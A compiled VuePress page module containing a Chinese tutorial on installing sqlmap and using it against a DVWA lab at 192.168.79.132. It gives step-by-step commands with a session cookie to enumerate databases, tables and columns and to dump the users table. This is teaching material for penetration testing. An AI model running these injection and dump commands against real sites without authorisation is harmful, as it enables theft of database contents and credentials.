import{_ as t}from"./plugin-vue_export-helper.21dcd24c.js";import{r as i,o as r,c as d,a as e,e as o,d as n,b as s}from"./app.a3d402e1.js";var l="/assets/sqlmap-1.png",c="/assets/sqlmap-2.png",p="/assets/sqlmap-3.png",u="/assets/sqlmap-4.png",h="/assets/sqlmap-5.png",m="/assets/sqlmap-6.png",g="/assets/sqlmap-7.png",b="/assets/sqlmap-8.png",_="/assets/sqlmap-9.png";const v={},q=n('<div class="custom-container tip"><p class="custom-container-title">\u524D\u8A00</p><p>\u6B64\u7CFB\u5217\u7B14\u8BB0\u662F\u7F51\u7EDC\u6E17\u900F\u5DE5\u5177\u7684\u4F7F\u7528\u65B9\u6CD5, \u672C\u7BC7\u662F\u4ECB\u7ECD SQL \u6CE8\u5165\u5DE5\u5177 SQLmap \u7684\u4F7F\u7528\u65B9\u6CD5\u3002SQLmap \u662F\u4E00\u6B3E\u7528\u6765\u68C0\u6D4B\u4E0E\u5229\u7528 SQL \u6CE8\u5165\u6F0F\u6D1E\u7684\u514D\u8D39\u5F00\u6E90\u5DE5\u5177, \u6709\u4E00\u4E2A\u975E\u5E38\u68D2\u7684\u7279\u6027, \u5373\u5BF9\u68C0\u6D4B\u4E0E\u5229\u7528\u7684\u81EA\u52A8\u5316\u5904\u7406\uFF08\u6570\u636E\u5E93\u6307\u7EB9\u3001\u8BBF\u95EE\u5E95\u5C42\u6587\u4EF6\u7CFB\u7EDF\u3001\u6267\u884C\u547D\u4EE4\uFF09\u3002</p></div><h2 id="sqlmap-\u73AF\u5883" tabindex="-1"><a class="header-anchor" href="#sqlmap-\u73AF\u5883" aria-hidden="true">#</a> SQLmap \u73AF\u5883</h2><div class="custom-container tip"><p class="custom-container-title">\u63D0\u793A</p><p>\u7531\u4E8E <code>kali Liunx</code> \u5DF2\u7ECF\u96C6\u6210\u4E86 SQLmap \u7684\u73AF\u5883, \u8FD9\u91CC\u5C31\u76F4\u63A5\u4ECB\u7ECD <code>Windows</code> \u4E0B\u73AF\u5883\u7684\u6784\u5EFA\u3002</p></div><h3 id="\u5148\u5B89\u88C5-python" tabindex="-1"><a class="header-anchor" href="#\u5148\u5B89\u88C5-python" aria-hidden="true">#</a> \u5148\u5B89\u88C5 Python</h3><p>\u6B63\u5E38\u60C5\u51B5\u4E0B\u6211\u4EEC\u5B89\u88C5 <code>2.7.x</code> \u5C31\u597D\u4E86\u3002</p>',5),k={href:"http://www.python.org/getit/",target:"_blank",rel:"noopener noreferrer"},S=s("Python \u5B98\u7F51\u4E0B\u8F7D\u5730\u5740"),x=e("p",null,[s("\u63A5\u4E0B\u6765\u53EA\u9700\u5728\u73AF\u5883\u53D8\u91CF "),e("code",null,"path"),s(" \u4E2D\u6DFB\u52A0 Python \u7684\u5B89\u88C5\u8DEF\u5F84\u5C31\u597D\u4E86\u3002"),e("br")],-1),L=e("p",null,[e("img",{src:l,alt:"SQLmap"})],-1),f=e("h3",{id:"\u518D\u5B89\u88C5-sqlmap",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#\u518D\u5B89\u88C5-sqlmap","aria-hidden":"true"},"#"),s(" \u518D\u5B89\u88C5 SQLmap")],-1),w={href:"http://sqlmap.org/",target:"_blank",rel:"noopener noreferrer"},P=s("SQLmap \u5B98\u7F51\u4E0B\u8F7D\u5730\u5740"),Q=n('<p>\u5C06 SQLmap \u89E3\u538B\u81F3 Python \u76EE\u5F55\u4E0B, \u5C06 SQLmap \u7684\u7A0B\u5E8F\u76EE\u5F55\u91CD\u547D\u540D\u4E3A sqlmap\u3002</p><h4 id="\u5728\u684C\u9762\u65B0\u5EFA\u5FEB\u6377\u65B9\u5F0F" tabindex="-1"><a class="header-anchor" href="#\u5728\u684C\u9762\u65B0\u5EFA\u5FEB\u6377\u65B9\u5F0F" aria-hidden="true">#</a> \u5728\u684C\u9762\u65B0\u5EFA\u5FEB\u6377\u65B9\u5F0F</h4><p><code>For Example:</code></p><p><img src="'+c+'" alt="SQLmap"></p><br><p><img src="'+p+'" alt="SQLmap"></p><br><p><img src="'+u+'" alt="SQLmap"></p><h2 id="dvwa-\u73AF\u5883" tabindex="-1"><a class="header-anchor" href="#dvwa-\u73AF\u5883" aria-hidden="true">#</a> DVWA \u73AF\u5883</h2><p>DVWA(Dam Vulnerable Web Application) \u4F7F\u7528 <code>PHP+Mysql</code> \u7F16\u5199\u7684\u4E00\u5957\u7528\u4E8E\u5E38\u89C4 WEB \u6F0F\u6D1E\u6559\u5B66\u548C\u68C0\u6D4B\u7684 WEB \u8106\u5F31\u6027\u6D4B\u8BD5\u7A0B\u5E8F\u3002\u5305\u542B SQL \u6CE8\u5165\u3001XSS\u3001\u76F2\u6CE8\u7B49\u5E38\u89C1\u7684\u4E00\u4E9B\u6F0F\u6D1E\u3002</p>',10),D={href:"http://github.com/ethicalhack3r/DVWA",target:"_blank",rel:"noopener noreferrer"},W=s("DVWA GitHub \u4E0B\u8F7D\u5730\u5740"),y=e("p",null,[s("\u5728 "),e("code",null,"Windows"),s(" \u4E0B\u8FD8\u9700\u5B89\u88C5 "),e("code",null,"PHP"),s(" \u73AF\u5883, \u8FD9\u91CC\u63A8\u4ECB\u4E24\u4E2A "),e("code",null,"PHP"),s(" \u96C6\u6210\u73AF\u5883\u3002")],-1),E={href:"http://www.upupw.net/",target:"_blank",rel:"noopener noreferrer"},V=s("upupw PHP \u96C6\u6210\u73AF\u5883"),B=s(),H={href:"http://www.phpstudy.net/",target:"_blank",rel:"noopener noreferrer"},A=s("phpStudy PHP \u96C6\u6210\u73AF\u5883"),T=n(`<p>\u63A5\u4E0B\u6765\u53EA\u9700\u4FEE\u6539\u4E00\u4E0B\u914D\u7F6E\u6587\u4EF6\u5C31\u597D\u4E86\u3002</p><h2 id="sqlmap-\u4F7F\u7528\u65B9\u6CD5" tabindex="-1"><a class="header-anchor" href="#sqlmap-\u4F7F\u7528\u65B9\u6CD5" aria-hidden="true">#</a> SQlmap \u4F7F\u7528\u65B9\u6CD5</h2><p><code>Windows</code> \u4E0B\u8DDF <code>kali Liunx</code> \u4E0B\u4F7F\u7528\u65B9\u6CD5\u4E0D\u76F8\u540C\u3002</p><p>\u4E3A\u65B9\u4FBF\u6F14\u793A, \u6211\u4EEC\u521B\u5EFA\u4E24\u4E2A\u865A\u62DF\u673A:</p><ul><li>\u53D7\u5BB3\u8005\u673A\u5668, <code>Windows 2003</code> \u64CD\u4F5C\u7CFB\u7EDF, \u8FD0\u884C\u4E00\u4E2A WEB \u670D\u52A1\u5668, \u540C\u65F6\u8DD1\u7740\u4E00\u4E2A\u5305\u542B\u6F0F\u6D1E\u7684 WEB \u5E94\u7528\uFF08DVWA\uFF09\u3002</li><li>\u653B\u51FB\u5668\u673A\u5668, \u4F7F\u7528 <code>kali Liunx</code> \u6216\u8005\u5176\u4ED6\u7248\u672C\u7684 <code>Windows</code> \u5305\u542B SQLmap \u7A0B\u5E8F\u3002</li></ul><p>\u672C\u6B21\u5B9E\u9A8C\u7684\u76EE\u7684: \u4F7F\u7528 SQLmap \u5F97\u5230\u4EE5\u4E0B\u4FE1\u606F:</p><ul><li>\u679A\u4E3E MYSQL \u7528\u6237\u540D\u4E0E\u5BC6\u7801\u3002</li><li>\u679A\u4E3E\u6240\u6709\u6570\u636E\u5E93\u3002</li><li>\u679A\u4E3E\u6307\u5B9A\u6570\u636E\u5E93\u7684\u6570\u636E\u8868\u3002</li><li>\u679A\u4E3E\u6307\u5B9A\u6570\u636E\u8868\u4E2D\u7684\u6240\u6709\u7528\u6237\u540D\u4E0E\u5BC6\u7801\u3002</li></ul><h3 id="\u67E5\u770B\u5E2E\u52A9" tabindex="-1"><a class="header-anchor" href="#\u67E5\u770B\u5E2E\u52A9" aria-hidden="true">#</a> \u67E5\u770B\u5E2E\u52A9</h3><p><code>Windows: </code> \u67E5\u770B Python \u5E2E\u52A9\u547D\u4EE4</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>python sqlmap.py -h
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>kali Liunx: </code> \u67E5\u770B Python \u5E2E\u52A9\u547D\u4EE4</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>sqlmap -h
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="custom-container warning"><p class="custom-container-title">\u6CE8\u610F</p><p>\u9700\u8981\u6CE8\u610F\u7684\u662F <code>Windows</code> \u4E0B\u7684\u9009\u9879\u548C <code>kali Liunx</code> \u4E0B\u7684\u9009\u9879\u662F\u4E00\u81F4\u7684, \u4F46\u662F\u547D\u4EE4\u662F\u4E0D\u4E00\u81F4\u7684\u3002\u5728 <code>Windows</code> \u4E0B\u4F7F\u7528 <code>python sqlmap.py</code> , \u800C\u5728 <code>kali Liunx</code> \u4E0B\u4F7F\u7528\u7684\u662F <code>sqlmap</code> \u3002</p></div><h3 id="\u9009\u9879\u89E3\u91CA" tabindex="-1"><a class="header-anchor" href="#\u9009\u9879\u89E3\u91CA" aria-hidden="true">#</a> \u9009\u9879\u89E3\u91CA</h3><ul><li><strong>--cookie</strong> =&gt; \u8BBE\u7F6E\u6211\u4EEC\u7684 cookie \u503C &quot;\u5C06 DVWA \u5B89\u5168\u7B49\u7EA7\u8BBE\u7F6E\u4E3A low&quot;</li><li><strong>--data</strong> =&gt; \u8BBE\u7F6E POST \u63D0\u4EA4\u7684\u503C, \u5982\u679C\u662F GET \u63D0\u4EA4, \u4E0D\u9700\u8981\u6B64\u9009\u9879</li><li><strong>-u</strong> =&gt; \u6307\u5B9A\u76EE\u6807 URL</li><li><strong>-b</strong> =&gt; \u83B7\u53D6 DBMS banner</li><li><strong>--current-db</strong> =&gt; \u83B7\u53D6\u5F53\u524D\u6570\u636E\u5E93</li><li><strong>--current-user</strong> =&gt; \u83B7\u53D6\u5F53\u524D\u6570\u636E\u5E93\u7684\u7528\u6237</li><li><strong>--tables</strong> =&gt; \u83B7\u53D6\u6570\u636E\u5E93\u91CC\u6240\u6709\u7684\u8868\u540D</li><li><strong>--columns</strong> =&gt; \u83B7\u53D6\u8868\u91CC\u7684\u6240\u6709\u5B57\u6BB5</li><li><strong>--dump</strong> =&gt; \u83B7\u53D6\u503C</li><li><strong>--current-user</strong> =&gt; \u83B7\u53D6\u5F53\u524D\u7528\u6237</li><li><strong>-D</strong> =&gt; \u7206\u5E93\u6307\u5B9A\u6570\u636E\u5E93\u540D</li><li><strong>-T</strong> =&gt; \u7206\u5E93\u6307\u5B9A\u8868\u540D</li><li><strong>-C</strong> =&gt; \u7206\u5E93\u6307\u5B9A\u5B57\u6BB5\u540D</li><li><strong>--string</strong> =&gt; \u5F53\u67E5\u8BE2\u53EF\u7528\u65F6\u7528\u6765\u5339\u914D\u9875\u9762\u4E2D\u7684\u5B57\u7B26\u4E32</li><li><strong>--users</strong> =&gt; \u679A\u4E3E DBMS \u7528\u6237</li><li><strong>--password</strong> =&gt; \u679A\u4E3E DBMS \u7528\u6237\u5BC6\u7801 hash</li><li><strong>--dbs</strong> =&gt; \u679A\u4E3E DBMS \u4E2D\u7684\u6570\u636E\u5E93</li></ul><h2 id="\u5F00\u59CB\u7206\u5E93" tabindex="-1"><a class="header-anchor" href="#\u5F00\u59CB\u7206\u5E93" aria-hidden="true">#</a> \u5F00\u59CB\u7206\u5E93</h2><p>\u7531\u4E8E <code>Windows</code> \u548C <code>kali Liunx</code> \u7684\u505A\u6CD5\u57FA\u672C\u4E00\u81F4, \u8FD9\u91CC\u4EE5 <code>kali Liunx</code> \u4E3A\u4F8B\u3002DVWA \u7684\u96BE\u5EA6\u4E3A low\u3002</p><h3 id="\u5148\u83B7\u53D6-cookie" tabindex="-1"><a class="header-anchor" href="#\u5148\u83B7\u53D6-cookie" aria-hidden="true">#</a> \u5148\u83B7\u53D6 Cookie</h3><p>\u6BCF\u4E00\u6B21\u7684 Cookie \u90FD\u4E0D\u4E00\u6837, \u8FD9\u91CC\u662F\u4E2A\u793A\u8303\u3002</p><p><code>For Example:</code> <br></p><p><img src="`+h+`" alt="SQLmap"></p><h3 id="\u83B7\u53D6\u6570\u636E\u5E93-current-db" tabindex="-1"><a class="header-anchor" href="#\u83B7\u53D6\u6570\u636E\u5E93-current-db" aria-hidden="true">#</a> \u83B7\u53D6\u6570\u636E\u5E93, --current-db</h3><p><code>For Example:</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>sqlmap -u <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie<span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> --current-db
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>URL \u5730\u5740\u548C Cookie \u8BF7\u7528\u771F\u5B9E\u7684\u66FF\u6362\u6389\u3002\u8FD9\u6761\u547D\u4EE4\u53EF\u4EE5\u628A\u5F53\u524D\u6240\u6709\u7684\u6570\u636E\u5E93\u83B7\u53D6\u51FA\u6765\u7684\u3002\u6CE8\u610F <code>--current-db</code> \u7684 <code>-</code> \u53EF\u662F\u6709\u4E24\u4E2A\u7684\u3002</p><p><img src="`+m+`" alt="SQLmap"></p><h3 id="\u83B7\u53D6\u8868-tables" tabindex="-1"><a class="header-anchor" href="#\u83B7\u53D6\u8868-tables" aria-hidden="true">#</a> \u83B7\u53D6\u8868, --tables</h3><p>\u524D\u9762, \u6211\u4EEC\u5DF2\u7ECF\u83B7\u53D6\u5230\u6570\u636E\u5E93\u540D, \u8FD9\u65F6\u5019\u6211\u4EEC\u8981\u6307\u5B9A\u6570\u636E\u5E93\u540D\u3002\u4F7F\u7528 <code>-D</code> \u9009\u9879\u6307\u5B9A\u6570\u636E\u5E93\u540D\u3002\u6CE8\u610F <code>--tables</code> \u7684 <code>-</code> \u53EF\u662F\u6709\u4E24\u4E2A\u7684\u3002</p><p><code>For Example:</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>sqlmap -u <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie<span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> -D <span class="token string">&#39;dvwa&#39;</span> --tables
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+g+`" alt="SQLmap"></p><h3 id="\u83B7\u53D6\u5B57\u6BB5-columns" tabindex="-1"><a class="header-anchor" href="#\u83B7\u53D6\u5B57\u6BB5-columns" aria-hidden="true">#</a> \u83B7\u53D6\u5B57\u6BB5, --columns</h3><div class="custom-container tip"><p class="custom-container-title">\u63D0\u793A</p><p>\u524D\u9762, \u6211\u4EEC\u5DF2\u7ECF\u83B7\u53D6\u5230\u6570\u636E\u5E93\u540D\u548C\u8868\u540D\u4E86, \u8FD9\u65F6\u5019\u6211\u4EEC\u8981\u6307\u5B9A\u6570\u636E\u5E93\u540D\u548C\u8868\u540D\u3002\u4F7F\u7528 <code>-D</code> \u9009\u9879\u6307\u5B9A\u6570\u636E\u5E93\u540D, \u4F7F\u7528 <code>-T</code> \u6307\u5B9A\u8868\u540D\u3002\u8FD9\u91CC\u6211\u4EEC\u9009\u62E9\u8868 <code>users</code> \u3002\u6CE8\u610F <code>--columns</code> \u7684 <code>-</code> \u53EF\u662F\u6709\u4E24\u4E2A\u7684\u3002</p></div><p><code>For Example:</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>sqlmap -u <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie<span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> -D <span class="token string">&#39;dvwa&#39;</span> -T <span class="token string">&#39;users&#39;</span> --columns
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+b+`" alt="SQLmap"></p><h3 id="\u83B7\u53D6\u6570\u636E-dump" tabindex="-1"><a class="header-anchor" href="#\u83B7\u53D6\u6570\u636E-dump" aria-hidden="true">#</a> \u83B7\u53D6\u6570\u636E, --dump</h3><div class="custom-container tip"><p class="custom-container-title">\u63D0\u793A</p><p>\u524D\u9762, \u6211\u4EEC\u5DF2\u7ECF\u83B7\u53D6\u5230\u6570\u636E\u5E93\u540D\u3001\u8868\u540D\u8FD8\u6709\u5B57\u6BB5\u540D\u4E86, \u8FD9\u65F6\u5019\u6211\u4EEC\u8981\u6307\u5B9A\u6570\u636E\u5E93\u540D\u3001\u8868\u540D\u8FD8\u6709\u5B57\u6BB5\u540D\u3002\u4F7F\u7528 <code>-D</code> \u9009\u9879\u6307\u5B9A\u6570\u636E\u5E93\u540D, \u4F7F\u7528 <code>-T</code> \u6307\u5B9A\u8868\u540D, \u4F7F\u7528 <code>-C</code> \u6307\u5B9A\u5B57\u6BB5\u540D\u3002\u8FD9\u91CC\u6211\u4EEC\u9009\u62E9\u8868 <code>users</code> \u4E2D\u7684\u5B57\u6BB5 <code>user_id</code> \u3002\u6CE8\u610F <code>--dump</code> \u7684 <code>-</code> \u53EF\u662F\u6709\u4E24\u4E2A\u7684\u3002</p></div><p><code>For Example:</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>sqlmap -u <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie<span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> -D <span class="token string">&#39;dvwa&#39;</span> -T <span class="token string">&#39;users&#39;</span> -C <span class="token string">&#39;user_id&#39;</span> --dump
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+_+'" alt="SQLmap"></p>',41);function C(F,I){const a=i("ExternalLinkIcon");return r(),d("div",null,[q,e("p",null,[e("a",k,[S,o(a)])]),x,L,f,e("p",null,[e("a",w,[P,o(a)])]),Q,e("p",null,[e("a",D,[W,o(a)])]),y,e("p",null,[e("a",E,[V,o(a)]),B,e("a",H,[A,o(a)])]),T])}var N=t(v,[["render",C],["__file","usage-of-sqlmap.html.vue"]]);export{N as default};
